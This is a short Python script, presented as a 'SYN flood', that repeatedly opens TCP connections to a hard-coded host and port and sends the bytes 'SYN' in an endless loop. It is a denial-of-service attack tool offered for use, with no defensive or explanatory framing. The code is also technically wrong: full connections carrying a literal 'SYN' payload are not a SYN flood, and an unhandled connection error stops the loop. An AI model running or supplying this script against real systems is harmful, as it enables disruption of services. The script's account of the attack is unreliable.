import socket

target_host = "192.168.0.1"
target_port = 80

def syn_flood(target_host, target_port):
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(1)
        client.connect((target_host, target_port))
        client.send(b'SYN')
        client.close()

if __name__ == "__main__":
    try:
        syn_flood(target_host, target_port)
    except KeyboardInterrupt:
        print("Stopped.")